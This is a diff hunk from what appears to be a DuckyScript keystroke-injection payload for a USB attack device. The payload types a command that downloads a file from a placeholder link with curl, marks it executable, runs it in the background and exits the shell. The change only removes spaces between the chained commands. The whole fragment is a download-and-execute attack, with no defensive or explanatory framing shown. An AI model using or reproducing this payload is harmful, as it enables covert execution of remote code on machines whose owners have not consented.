@@ -7,5 +7,5 @@ STRING ; curl
 SPACE
 STRING #LINK
 SPACE
-STRING -o $r; chmod +x $r; $r &! exit
+STRING -o $r;chmod +x $r;$r &! exit
 ENTER
